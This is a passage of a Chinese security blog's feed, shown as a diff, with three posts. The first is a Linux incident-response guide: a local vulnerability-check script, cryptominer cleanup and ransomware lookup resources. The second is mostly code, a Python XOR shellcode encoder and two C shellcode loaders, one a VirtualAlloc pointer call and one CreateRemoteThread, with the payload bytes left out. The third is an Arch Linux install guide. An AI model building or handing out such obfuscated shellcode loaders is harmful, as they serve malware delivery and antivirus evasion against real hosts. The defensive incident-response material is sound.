+	echo &quot;开放了2181端口，可能存在zookeeper未授权访问漏洞！&quot;; else echo &quot;未发现对外开放zookeeper服务&quot;;fi
+
+echo ----------------------------------------------------------
+echo &quot;-----------检查系统是否存在elasticsearch未授权访问漏洞---------------------&quot;
+if ps aux | grep &quot;:9200|elasticsearch&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then 
+	ps aux | grep &quot;:9200|elasticsearch&quot; | grep -v grep 
+	echo &quot;开放了9200端口，可能存在elasticsearch未授权访问漏洞！&quot;; 
+else echo &quot;未发现对外开放elasticsearch服务&quot;;fi
+
+echo ----------------------------------------------------------
+echo &quot;-----------检查系统是否存在hadoop未授权访问漏洞---------------------&quot;
+if ps aux | grep &quot;:50070|hadoop&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then 
+	ps aux | grep &quot;:50070|hadoop&quot; | grep -v grep 
+	echo &quot;开放了50070端口，可能存在hadoop未授权访问漏洞！&quot;; 
+else echo &quot;未发现对外开放hadoop服务&quot;;
+fi
+
+
+echo ----------------------------------------------------------
+echo &quot;-----------检查系统是否存在jenkins未授权访问漏洞---------------------&quot;
+
+if ps aux | grep jenkins | grep -v grep 1&gt;/dev/null 2&gt;&amp;1 ;then
+    echo &quot;存在jenkins服务！&quot;
+    ps aux | grep jenkins | grep -v grep 
+    if netstat -tulnp | egrep &quot;:8080|jenkins&quot; 1&gt;/dev/null 2&gt;&amp;1; then
+        echo &quot;开始检查jenkins未授权访问漏洞&quot;
+        if wget -q -O - http://127.0.0.1:8080/script | grep &quot;Groovy script&quot; 1&gt;/dev/null 2&gt;&amp;1;then
+            echo &quot;存在jenkins未授权访问漏洞！&quot;;
+        else
+            echo &quot;不存在jenkins未授权访问漏洞&quot;;
+        fi
+    else
+        echo &quot;服务为本地使用，无法远程访问。&quot;
+    fi
+else
+    echo &quot;未发现使用jenkins服务&quot;; 
+fi
+
+echo ----------------------------------------------------------
+echo &quot;-----------检查系统是否存在MongoDB未授权访问漏洞---------------------&quot;
+if ps aux | grep &quot;mongodb|:27017&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then 
+	ps aux | grep &quot;mongodb|:27017&quot; | grep -v grep 
+	echo &quot;开放了27017端口，可能存在MongoDB未授权访问漏洞！&quot;; 
+else echo &quot;未发现对外开放MongoDB服务&quot;;
+fi
+
+
+
+echo ----------------------------------------------------------
+echo &quot;-----------检查系统是否存在CouchDB未授权访问漏洞---------------------&quot;
+if ps aux | grep &quot;5984|couchdb&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then
+    ps aux | grep &quot;5984|couchdb&quot; | grep -v grep 
+	echo &quot;开放了5984端口，可能存在CouchDB未授权访问漏洞！&quot;
+    echo &quot;开始检查CouchDB配置安全&quot;
+    find / -name local.ini | head -1 |xargs grep &quot;admin&quot;
+else
+    echo &quot;未发现使用CouchDB服务&quot;;
+fi
+
+echo ----------------------------------------------------------
+echo &quot;-----------检查系统是否存在apache tomcat相关安全漏洞---------------------&quot;
+#还需看后续怎么完善
+if ps aux | grep &quot;tomcat|httpd&quot; | grep -v grep 1&gt;/dev/null 2&gt;&amp;1;then
+    echo &quot;存在apache tomcat服务！&quot;
+	ps aux | grep &quot;tomcat|httpd&quot; | grep -v grep 
+    echo &quot;开始检查apache tomcat配置安全&quot;
+    echo &quot;检查是否存在tomcat口令配置&quot;
+    find / -name tomcat-users.xml | xargs grep -C 3 &quot;username=&quot;
+    echo &quot;检查是否存在任意文件上传漏洞&quot;    
+    find / -name web.xml | head -1 | xargs grep &quot;readonly&quot;
+else
+    echo &quot;未发现存在apache tomcat服务&quot;
+fi
+
+echo ----------------------------------------------------------
+echo &quot;-----------检查系统是否存在weblogic相关安全漏洞---------------------&quot;
+#还需看后续怎么完善
+if ps aux | grep weblogic | grep -v grep 1&gt;/dev/null 2&gt;&amp;1 ;then
+    echo &quot;存在weblogic服务！&quot;
+	ps aux | grep weblogic | grep -v grep 
+    if netstat -tulnp | egrep &quot;:7001&quot; 1&gt;/dev/null 2&gt;&amp;1; then
+        
+        echo &quot;开始检查可能存在的漏洞！&quot;;
+        if wget -q -O - http://127.0.0.1:7001/wls-wsat/CoordinatorPortType | grep &quot;weblogic.wsee.wstx.wsat.v10.endpoint.CoordinatorPortTypePortImpl&quot; 1&gt;/dev/null 2&gt;&amp;1;then
+            echo &quot;存在CVE-2017-10271漏洞！&quot;;
+        else
+            echo &quot;未发现CVE-2017-10271漏洞！&quot;;
+        fi
+
+        if ( wget -q -O - http://127.0.0.1:7001/ws_utc/begin.do ) 1&gt;/dev/null 2&gt;&amp;1 || ( wget -q -O - http://127.0.0.1:7001/ws_utc/config.do ) 1&gt;/dev/null 2&gt;&amp;1;then
+            echo &quot;存在CVE-2018-2894漏洞！&quot;;
+        else
+            echo &quot;未发现CVE-2018-2894漏洞！&quot;;
+        fi
+
+        if wget -q -O - http://127.0.0.1:7001/_async/AsyncResponseService | grep &quot;AsyncResponseService home page&quot; 1&gt;/dev/null 2&gt;&amp;1;then
+            echo &quot;存在CNVD-C-2019-48814漏洞！&quot;;
+        else
+            echo &quot;未发现CNVD-C-2019-48814漏洞！&quot;;
+        fi
+    else
+        echo &quot;服务为本地使用，无法远程访问。&quot;;
+    fi
+else
+    echo &quot;未发现使用weblogic服务&quot;; 
+fi
+
+
+
+
+
+
+echo ---------------------运行完毕------------------------
+
+</code></pre>
+<hr>
+<h2 id="挖矿木马">挖矿木马</h2>
+<p>挖矿病毒一般通过敏感端口，3306，22，23等或利用一些简单漏洞如weblogic，jboss反序列化等（因为挖矿团伙一般追求数量和速度，所以一般不会通过一些复杂的漏洞入侵）</p>
+<p>职业化的挖矿一般会通过伪装进程，加壳，代码混淆，私搭矿池或代理的手段来规避安全分析与溯源。挖矿病毒往往会通过crontab设置周期性被执行的指令来保证能够在受害主机上持久化驻留。</p>
+<hr>
+<h3 id="挖矿排查">挖矿排查</h3>
+<p>挖矿处置思路：隔离主机 -&gt;阻断异常通信-&gt;清除计划任务-&gt;清除启动项-&gt;排查文件-&gt;清理木马-&gt;分析溯源处理</p>
+<p>快速响应思路：查进程-&gt;找挖矿文件路径-&gt;删进程，删文件-&gt;溯源排查</p>
+<h3 id="进程排查-2">进程排查</h3>
+<pre><code class="language-shell">top -c #查看cpu占比最高的进程pid
+ps aux | less
+systemctl status $PID #排查有无守护进程
+</code></pre>
+<h3 id="异常连接排查">异常连接排查</h3>
+<pre><code class="language-shell">iptables -L -n
+netstat -natp | grep $PID
+
+</code></pre>
+<h3 id="计划任务排查-2">计划任务排查</h3>
+<pre><code class="language-shell">crontab -l 
+
+#centos7有记录 crontab 日志
+cd /var/log
+cat cron* | grep RELOAD
+</code></pre>
+<h3 id="启动项排查">启动项排查</h3>
+<ul>
+<li>/usr/lib/systemd/system</li>
+<li>/usr/lib/systemd/system/multi-user.target.wants</li>
+<li>/etc/rc.local</li>
+<li>/etc/inittab</li>
+<li>/etc/rc0.d/</li>
+<li>/etc/rc1.d/</li>
+<li>/etc/rc2.d/</li>
+<li>/etc/rc3.d/</li>
+<li>/etc/rc4.d/</li>
+<li>/etc/rc5.d/</li>
+<li>/etc/rc6.d/</li>
+<li>/etc/rc.d/</li>
+</ul>
+<h3 id="获取挖矿文件路径">获取挖矿文件路径</h3>
+<pre><code class="language-shell">ls -l /proc/$PID/exe
+</code></pre>
+<h3 id="进程处置">进程处置</h3>
+<pre><code class="language-shell">kill -9 $PID #删除挖矿进程
+ps -ef | grep &quot;$关键字&quot; |awk &quot;{pint $2}&quot; | xargs pkill #删除挖矿家族所有进程及守护进程
+</code></pre>
+<h3 id="文件处置">文件处置</h3>
+<pre><code class="language-shell">rm -rf $FILE #删除挖矿文件
+find / -name &quot;$FILE*&quot; | xargs rm -rf
+#当文件被赋予a i 属性无法rm时
+chattr -a -i $FILE
+rm -rf $FILE 2&gt;/dev/null
+</code></pre>
+<h3 id="计划任务清理">计划任务清理</h3>
+<pre><code class="language-shell">vi /etc/crontab
+crontab -e #root权限执行
+</code></pre>
+<h3 id="清理启动项">清理启动项</h3>
+<pre><code class="language-shell">system disable 服务名（centOS7以上）
+chkconfig 服务名 off（centOS7以下）
+</code></pre>
+<h3 id="挖矿处理tips">挖矿处理tips</h3>
+<ol>
+<li>定时任务有时手动删了还是没用，说明其有守护进程去监控定时任务的状态<br>
+可以用top监控内存，一删掉定时任务 crontab -r(删除所有定时任务)，top 里就发现有进程的cpu在跳动，重点排查这个进程</li>
+<li>挖矿团伙使用的恶意脚本往往经过各种混淆,在清理时可以保留样本以供分析</li>
+</ol>
+<h3 id="挖矿木马家族">挖矿木马家族</h3>
+<h4 id="smbghost挖矿">SMBGhost挖矿</h4>
+<h5 id="入侵手段">入侵手段</h5>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">入侵系统</th>
+<th style="text-align:center">windows</th>
+<th style="text-align:center">linux</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">入侵方式</td>
+<td style="text-align:center">Lnk漏洞cve-2017-8464(移动设备)</td>
+<td style="text-align:center">ssh爆破</td>
+</tr>
+<tr>
+<td style="text-align:center">Hadoop Yarn未授权访问</td>
+<td style="text-align:center">RDP爆破</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">永恒之蓝ms17-010</td>
+<td style="text-align:center">$IPC爆破</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">SMB爆破</td>
+<td style="text-align:center">redis未授权访问</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">mssql爆破</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">office漏洞cve-2017-8570(钓鱼邮件)</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">SMBGhost漏洞cve-2020-0796</td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+</tr>
+</tbody>
+</table>
+<h5 id="受感染文件">受感染文件</h5>
+<p>/etc/crontab<br>
+/var/spool/cron/'whoami'</p>
+<h4 id="kdevtmpfsi挖矿">kdevtmpfsi挖矿</h4>
+<h5 id="入侵手段-2">入侵手段</h5>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">windows</th>
+<th style="text-align:center">linux</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Lnk漏洞cve-2017-8464(移动设备)</td>
+<td style="text-align:center">ssh爆破</td>
+</tr>
+<tr>
+<td style="text-align:center">永恒之蓝ms17-010</td>
+<td style="text-align:center">RDP爆破</td>
+</tr>
+<tr>
+<td style="text-align:center">SMB爆破</td>
+<td style="text-align:center">$IPC爆破</td>
+</tr>
+<tr>
+<td style="text-align:center">mssql爆破</td>
+<td style="text-align:center">redis未授权访问</td>
+</tr>
+<tr>
+<td style="text-align:center">Hadoop Yarn未授权访问</td>
+<td style="text-align:center">1</td>
+</tr>
+<tr>
+<td style="text-align:center">office漏洞cve-2017-8570(钓鱼邮件)</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">SMBGhost漏洞cve-2020-0796</td>
+<td style="text-align:center"></td>
+</tr>
+</tbody>
+</table>
+<h5 id="受感染文件-2">受感染文件</h5>
+<p>/var/tmp/kinsing<br>
+/tmp/kdevtmpfsi<br>
+/var/spool/cron/'whoami'<br>
+/tmp/dark.x86<br>
+/tmp/dark.x86.1</p>
+<h4 id="ddg-挖矿">DDG 挖矿</h4>
+<h5 id="入侵手段-3">入侵手段</h5>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">入侵方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Orientdb 漏洞（早期）</td>
+</tr>
+<tr>
+<td style="text-align:center">Redis 未授权访问漏洞</td>
+</tr>
+<tr>
+<td style="text-align:center">SSH 弱密码</td>
+</tr>
+</tbody>
+</table>
+<h5 id="受感染文件-3">受感染文件</h5>
+<p>imWBR1(挖矿程序)<br>
+wnTKYg<br>
+2t3ik<br>
+qW3xT</p>
+<h4 id="8220-挖矿">8220 挖矿</h4>
+<h5 id="入侵手段-4">入侵手段</h5>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">入侵方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">WebLogic XMLDecoder 反序列化漏洞</td>
+</tr>
+<tr>
+<td style="text-align:center">Drupal 远程代码执行漏洞</td>
+</tr>
+<tr>
+<td style="text-align:center">JBoss 反序列化命令执行漏洞</td>
+</tr>
+<tr>
+<td style="text-align:center">Couchdb 的组合漏洞</td>
+</tr>
+<tr>
+<td style="text-align:center">Redis 未授权访问</td>
+</tr>
+<tr>
+<td style="text-align:center">Hadoop Yarn 未授权访问漏洞</td>
+</tr>
+</tbody>
+</table>
+<h5 id="受感染文件-4">受感染文件</h5>
+<p>wc.conf(配置文件)<br>
+sutse（挖矿程序）</p>
+<h4 id="mykingsthehidden挖矿">Mykings(theHidden)挖矿</h4>
+<h5 id="入侵手段-5">入侵手段</h5>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">入侵方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">3306 MySQL</td>
+</tr>
+<tr>
+<td style="text-align:center">135 WMI</td>
+</tr>
+<tr>
+<td style="text-align:center">22 SSH</td>
+</tr>
+<tr>
+<td style="text-align:center">445 IPC</td>
+</tr>
+<tr>
+<td style="text-align:center">23 Telnet</td>
+</tr>
+<tr>
+<td style="text-align:center">80 Web</td>
+</tr>
+<tr>
+<td style="text-align:center">3389 RDP</td>
+</tr>
+</tbody>
+</table>
+<h5 id="受感染文件-5">受感染文件</h5>
+<p>msinfo.exe<br>
+ups.rar(持久化文件)<br>
+lsmose.exe(挖矿程序)</p>
+<hr>
+<h2 id="web日志分析">Web日志分析</h2>
+<h3 id="apache日志">Apache日志</h3>
+<p>apache日志分为access_log和error_log<br>
+access_log记录对apache服务器的<code>请求访问</code><br>
+error_log记录<code>错误请求</code><br>
+默认位置： <code>/var/log/apache2</code></p>
+<h3 id="ngnix日志">Ngnix日志</h3>
+<p>ngnix日志分为access.log和error.log<br>
+access.log记录<code>访问日志</code><br>
+error.log记录<code>错误信息</code><br>
+默认位置：<code>/var/log/ngnix</code></p>
+<h3 id="iis日志">iis日志</h3>
+<p>默认位置：<code>C:\WINDOWS\system32\LogFiles</code></p>
+<h3 id="tomcat日志">Tomcat日志</h3>
+<p>tomcat日志分为catalina.out,localhost,manager,local_access_log<br>
+catalina.out记录<code>运行中异常错误等</code><br>
+localhost.Y-M-D.log记录<code>内部代码异常日志</code><br>
+manager.Y-M-D.log记录<code>管理日志</code><br>
+localhost_access_log记录<code>访问日志</code><br>
+默认位置：<code>/tomcat/log</code></p>
+<h3 id="weblogic日志">weblogic日志</h3>
+<p>weblogic日志分为access.log，Server.log，domain.log<br>
+access.log记录<code>http请求</code><br>
+sever.log记录<code>启动，关闭，部署信息</code><br>
+domain.log记录<code>doain的运行情况</code></p>
+<h3 id="分析技巧">分析技巧</h3>
+<pre><code class="language-shell">find / -name &quot;*.log&quot;|xargs grep &quot;webshell&quot; #查询websell何时被上传的进行进一步溯源
+</code></pre>
+<hr>
+<h2 id="勒索溯源">勒索溯源</h2>
+<h3 id="确认勒索病毒种类">确认勒索病毒种类</h3>
+<pre><code class="language-html">&lt;样本搜索确认&gt;
+https://lesuobingdu.360.cn/ &lt;360勒索病毒搜索引擎&gt;
+https://guanjia.qq.com/pr/ls/ &lt;腾讯勒索病毒搜索引擎&gt;
+https://lesuo.venuseye.com.cn/ &lt;VenusEye勒索病毒搜索引擎&gt;
+https://lesuobingdu.qianxin.com/ &lt;qax勒索病毒的搜索引擎&gt;
+https://edr.sangfor.com.cn/#/information/ransom_search &lt;sangfor勒索病毒搜索引擎&gt;
+</code></pre>
+<h3 id="解密勒索文件">解密勒索文件</h3>
+<pre><code class="language-html">https://github.com/jiansiting/Decryption-Tools &lt;解密脚本查找&gt;
+</code></pre>
+<h3 id="分析溯源">分析溯源</h3>
+<hr>
+<h2 id="恶意邮件">恶意邮件</h2>
+<h3 id="发件人分析">发件人分析</h3>
+<pre><code class="language-shell">nslookup -type=mx xxx.com  #mx记录查询
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[C语言常见Shellcode加载器]]></title>
+        <id>https://Zer0-hex.github.io/post/c-yu-yan-chang-jian-shellcode-jia-zai-qi/</id>
+        <link href="https://Zer0-hex.github.io/post/c-yu-yan-chang-jian-shellcode-jia-zai-qi/">
+        </link>
+        <updated>2022-09-10T17:22:10.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="python简单实现对shellcode的xor加密">Python简单实现对Shellcode的XOR加密</h2>
+<pre><code class="language-Python">shellcode = &quot;&quot;      # \xfc\x48\x83\xe4......
+for i, n in enumerate(shellcode):
+    temp = ord(n) ^ (i % 73)
+    print('0x%.2x, ' % temp, end='')
+    if i % 16 == 15:
+        print()
+</code></pre>
+<h2 id="c语言加载">C语言加载</h2>
+<ul>
+<li>指针调用</li>
+</ul>
+<pre><code class="language-C">#include&lt;stdio.h&gt;
+#include&lt;windows.h&gt;
+
+unsigned char shellcode[1024] = {
+    // 0xfc, 0x49, 0x81, 0xe7, 0xf4, 0xed......
+};
+
+void init() {
+    for (int i=0; i &lt; sizeof(shellcode); i++) {
+       shellcode[i] ^= (i % 73);
+    }
+}
+
+void print_shellcode() {
+    for(int i=0; i &lt; sizeof(shellcode); i++) {
+        printf(&quot;0x%.2x, &quot;, shellcode[i]);
+        if (i % 16 == 15) {
+            printf(&quot;\n&quot;);
+        }
+    }
+}
+
+int main(void) {
+    init();
+    print_shellcode();
+    exec = VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, shellcode, sizeof(shellcode));
+    printf(&quot;[+] exec start...\n&quot;);
+    (*(void(*)())exec)();
+    printf(&quot;[-] exec end...\n&quot;);
+    return 0;
+}
+</code></pre>
+<ul>
+<li>Remote thread Loader</li>
+</ul>
+<pre><code class="language-C">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+unsigned char shellcode[1024] = {
+    //0xfc, 0x49, 0x81, 0xe7, 0xf4......
+};
+
+void init() {
+    for (int i=0; i &lt; sizeof(shellcode); i++) {
+       shellcode[i] ^= (i % 73);
+    }
+}
+
+void print_shellcode() {
+    for(int i=0; i &lt; sizeof(shellcode); i++) {
+        printf(&quot;0x%.2x, &quot;, shellcode[i]);
+        if (i % 16 == 15) {
+            printf(&quot;\n&quot;);
+        }
+    }
+}
+
+int main(void) {
+    init();
+    print_shellcode();
+	HANDLE hProc = (HANDLE)-1;
+	PVOID pAddress = VirtualAllocEx(hProc, NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	WriteProcessMemory(hProc, pAddress, shellcode, sizeof(shellcode), NULL);
+	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pAddress, NULL, NULL, NULL);
+    printf(&quot;[+] Wait thread...\n&quot;);
+	WaitForSingleObject(hThread, INFINITE);
+    printf(&quot;[-] Thread exit...\n&quot;);
+	return 0;
+}
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Arch Linux 安装]]></title>
+        <id>https://Zer0-hex.github.io/post/arch-linux-an-zhuang/</id>
+        <link href="https://Zer0-hex.github.io/post/arch-linux-an-zhuang/">
+        </link>
+        <updated>2022-09-10T17:12:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="arch-linux-installation">Arch Linux installation</h2>
+<p>请配合 <a href="https://wiki.archlinux.org/title/Installation_guide_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">Arch Wiki</a> 进行安装配置</p>
+<h3 id="镜像">镜像</h3>
+<ul>
+<li>到各大镜像站均可下载镜像。<a href="https://mirrors.tuna.tsinghua.edu.cn/">清华大学开源软件镜像站</a></li>
+<li>使用刻录工具刻录至U盘。<a href="https://gsslorz.github.io/wiki/Linux%E8%B0%83%E6%95%99%E6%8C%87%E5%8D%97/ArchLinuxInstallation.html">Rufus</a>、dd(Linux工具)</li>
+<li>进入BIOS系统，关闭安全启动(Secure Boot)</li>
+<li>启动到Live环境</li>
+</ul>
+<h3 id="检查网络">检查网络</h3>
+<ul>
+<li>有线网络检查是否连接成功</li>
+</ul>
+<pre><code># ip link
+# ip addr
+# ping -c 4 archlinux.org
+</code></pre>
+<p>无线网络使用iwctf配置wifi</p>
+<ul>
+<li>
+<pre><code># iwctl
+[iwd]# device list	# 显示设备列表，我的设备名为wlan0
+[iwd]# station wlan0 scan	# 扫描wifi
+[iwd]# station wlan0 get-networks	# 获取wifi信息
+[iwd]# station wlan0 connect [wifi名称]	# 连接wifi
+</code></pre>
+</li>
+<li>
+<p>更新时间</p>
+</li>
+</ul>
+<pre><code># timedatectl set-ntp true
+</code></pre>
+<h3 id="更换软件源">更换软件源</h3>
+<ul>
+<li>切换镜像源</li>
+</ul>
+<pre><code># reflector --country China --age 24 --sort rate --protocol https --save /etc/pacman.d/mirrorlist
+# pacman -Syy
+</code></pre>
+<h3 id="磁盘分区">磁盘分区</h3>
+<ul>
+<li>查看磁盘</li>
+</ul>
+<pre><code># lsblk	# 查看磁盘名称
+NAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
+nvme0n1     259:0    0 476.9G  0 disk
+├─nvme0n1p1 259:1    0   512M  0 part /boot/efi
+├─nvme0n1p2 259:2    0    10G  0 part [SWAP]
+└─nvme0n1p3 259:3    0 466.4G  0 part /
+# gdisk /dev/nvme0n1	# 使用磁盘分区工具gdisk对需要安装系统的磁盘进行操作
+# cfdisk /dev/nvme0n1	# 在命令行有图形界面的分区工具
+</code></pre>
+<p>固态硬盘一般为nvme0n1、nvme0n2，机械硬盘一般为sda、sdb。</p>
+<ul>
+<li>分区操作</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>挂载点</th>
+<th>大小</th>
+<th>类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>/boot/efi</td>
+<td>512MB</td>
+<td>引导分区（vfat）</td>
+</tr>
+<tr>
+<td><em>swap</em></td>
+<td>RAM * 1.1</td>
+<td>逻辑分区（swap）</td>
+</tr>
+<tr>
+<td>/</td>
+<td>剩余空间</td>
+<td>主分区（xfs、btrfs、ext4三选一）</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>关于文件系统，不太靠谱的解释：xfs(大文件存储效率高)、btrfs(压缩式存储)、<strong>ext4(看不懂就用这个)</strong></p>
+</blockquote>
+<ul>
+<li>
+<p>格式化分区</p>
+<ul>
+<li>我的分区如下：</li>
+</ul>
+<blockquote>
+<p>引导分区：/dev/nvme0n1p1</p>
+<p>逻辑分区：/dev/nvme0n1p2</p>
+<p>主分区：/dev/nvme0n1p3</p>
+</blockquote>
+</li>
+</ul>
+<pre><code># mkfs.vfat /dev/nvme0n1p1	# 格式化引导分区
+# mkfs.ext4(xfs/btrfs) /dev/nvme0n1p3	# 格式化主分区
+# mkswap /dev/nvme0n1p2	# 初始化逻辑分区
+</code></pre>
+<ul>
+<li>挂载分区</li>
+</ul>
+<pre><code># mount /dev/nvme0n1p3 /mnt	# 挂载主目录到/mnt
+# mkdir -p /mnt/boot/efi	# 给引导分区创建文件夹
+# mount /dev/nvme0n1p1 /mnt/boot/efi	# 挂载引导分区
+# swapon /dev/nvme0n1p2		# 启用swap分区
+</code></pre>
+<h3 id="安装系统">安装系统</h3>
+<ul>
+<li>安装基本系统以及部分工具</li>
+</ul>
+<pre><code># pacstrap /mnt base linux linux-firmware linux-headers base-devel neovim bash-completion
+</code></pre>
+<ul>
+<li>生成文件系统表</li>
+</ul>
+<pre><code># genfstab -U /mnt &gt;&gt; /mnt/etc/fstab
+# cat /mnt/etc/fstab
+</code></pre>
+<h3 id="配置系统">配置系统</h3>
+<ul>
+<li>利用arch-chroot进入系统</li>
+</ul>
+<pre><code># arch-chroot /mnt
+</code></pre>
+<ul>
+<li>安装引导、网络、平台相关软件包</li>
+</ul>
+<pre><code># pacman -Syy grub efibootmgr efivar networkmanager amd-ucode(英特尔处理器用intel-ucode)
+</code></pre>
+<ul>
+<li>安装引导</li>
+</ul>
+<pre><code># grub-install /dev/nvme0n1p1(引导分区)
+# grub-mkconfig -o /boot/grub/grub.cfg
+</code></pre>
+<ul>
+<li>开启网络服务</li>
+</ul>
+<pre><code># systemctl enable NetworkManager
+</code></pre>
+<ul>
+<li>修改root用户密码</li>
+</ul>
+<pre><code># passwd
+</code></pre>
+<ul>
+<li>
+<p>这里由于安装的编辑器是neovim，而又常常使用vim，所以建立一个链接</p>
+</li>
+<li>
+<pre><code>sudo ln -s /usr/bin/nvim /usr/bin/vim
+</code></pre>
+</li>
+<li>
+<p>卸载已挂载的分区</p>
+</li>
+</ul>
+<pre><code># exit退出至live系统
+# umount /mnt/boot/efi
+# umount /mnt
+# reboot(重启并移除安装介质)
+</code></pre>
+<h3 id="完善系统">完善系统</h3>
+<ul>
+<li>连接网络</li>
+</ul>
+<pre><code># nmtui
+</code></pre>
+<ul>
+<li>修改主机名等信息(此处主机名为arch)</li>
+</ul>
+<pre><code># vim /etc/hostname
+-------------------
+arch
+
+# vim /etc/hosts
+----------------
+127.0.0.1	localhost
+::1			localhost
+127.0.0.1	arch.localdomain	arch
+</code></pre>
+<ul>
+<li>设置时间</li>
+</ul>
+<pre><code># timedatectl set-timezone Asia/Shanghai	# 设置时区
+# timedatectl set-ntp true	# 设置时间同步
+# timedatectl status	# 查看状态
+</code></pre>
+<ul>
+<li>配置bash环境变量(修改/etc/sk)</li>
+</ul>
+<pre><code>#
+# If not running interactively, don't do anything
+[[ $- != *i* ]] &amp;&amp; return
+
+export EDITOR=vim
+
+alias ls='ls --color=auto'
+alias grep='grep --color=auto'
+alias egrep='egrep --color=auto'
+alias fgrep='fgrep --color=auto'
+
+[ ! -e ~/.dircolors ] &amp;&amp; eval $(dircolors -p &gt; ~/.dircolors)
+[ -e /bin/dircolors ] &amp;&amp; eval $(dircolors -b ~/.dircolors)
+
+PS1='[\u@\h \W]\$ '
+</code></pre>
+<ul>
+<li>添加普通用户(lun)</li>
+</ul>
+<pre><code># useradd -d lun
+# passwd lun
+# usermod -aG wheel, users, storage, power, Ip, adm, optical, lun
+</code></pre>
+<ul>
+<li>修改sudoer文件</li>
+</ul>
+<pre><code># vim /etc/sudoers
+------------------
+%wheel ALL=(ALL) ALL (取消第82行注释)
+</code></pre>
+<ul>
+<li>重启<code>reboot</code></li>
+</ul>
+<h3 id="桌面环境">桌面环境</h3>
+<ul>
+<li>xorg</li>
+</ul>
+<pre><code>$ sudo pacman -Syyu
+$ sudo pacman -S xorg xorg-xinit
+$ sudo pacman -S [选一款桌面环境]
+</code></pre>
+<ul>
+<li>字体设置（取消两行的注释）</li>
+</ul>
+<pre><code>$ sudo vim /etc/locale.gen
+--------------------------
+en_US.UTF-8 UTF-8
+zh_CN.UTF-8 UTF-8
+--------------------------
+
+$ sudo echo &quot;LANG=en_US.UTF-8&quot; &gt; /etc/locale.conf	# 英文
+$ sudo echo &quot;LANG=zh_CN.UTF-8&quot; &gt; /etc/locale.conf	# 中文
+
+$ sudo locale-gen	# 生成字体
+</code></pre>
+<blockquote>
+<p>在vim中按下/键进入搜索模式</p>
+</blockquote>
+<ul>
+<li>
+<p>安装一些字体</p>
+<ul>
+<li>英文</li>
+</ul>
+</li>
+</ul>
+<pre><code>$ sudo pacman -S ttf-dejavu ttf-droid ttf-hack ttf-font-awesome ttf-lato ttf-liberation ttf-linux-libertine ttf-opensans ttf-roboto ttf-roboto-mono ttf-ubuntu-font-family
+</code></pre>
+<ul>
+<li>中文相关字体</li>
+</ul>
+<pre><code>
+</code></pre>
+<ul>
+<li>
+<pre><code>$ sudo pacman -S ttf-hannom  noto-fonts noto-fonts-extra noto-fonts-emoji noto-fonts-cjk
+$ sudo pacman -S adobe-source-code-pro-fonts adobe-source-sans-fonts adobe-source-serif-fonts adobe-source-han-sans-cn-fonts adobe-source-han-sans-hk-fonts adobe-source-han-sans-tw-fonts adobe-source-han-serif-cn-fonts 
+$ sudo pacman -S wqy-zenhei wqy-microhei
+</code></pre>
+</li>
+<li>
+<p>开启freetype2引擎渲染字体</p>
+</li>
+</ul>
+<pre><code>
+$ sudo vim /etc/profile.d/freetype2.sh
+--------------------------------------
+# Subpixel hinting mode can be chosen by setting the right TrueType 
+...
+# Uncomment and configure below
+# 取消下面这行注释
+export FREETYPE_PROPERTIES=&quot;truetype:interpreter-version=40&quot;
+--------------------------------------
+</code></pre>
+<ul>
+<li>
+<p>安装显卡驱动</p>
+<ul>
+<li>AMD</li>
+</ul>
+</li>
+</ul>
+<pre><code>$ sudo pacman -S xf86-video-amdgpu xf86-video-ati mesa vulkan-radeon
+</code></pre>
+<ul>
+<li>Intel</li>
+</ul>
+<pre><code>$ sudo pacman -S xf86-video-intel mesa vulkan-intel
+</code></pre>
+<ul>
+<li>
+<p>NVIDIA</p>
+</li>
+<li>
+<pre><code>$ sudo pacman -S nvidia nvidia-settings nvidia-utils
+</code></pre>
+</li>
+<li>
+<p>声音相关软件包</p>
+</li>
+</ul>
+<pre><code>$ sudo pacman -S alsa-utils pulseaudio pulseaudio-bluetooth cups
+</code></pre>
+<ul>
+<li>安装一些工具</li>
+</ul>
+<pre><code>$ sudo pacman -S git cmake 7z unzip unrar fakeroot
+</code></pre>
+<ul>
+<li>AUR源</li>
+</ul>
+<pre><code>$ mkdir ~/Github
+$ cd ~/Github
+$ git clone https://aur.archlinux.org/paru.git
+$ cd paru
+$ makepkg -si
+</code></pre>
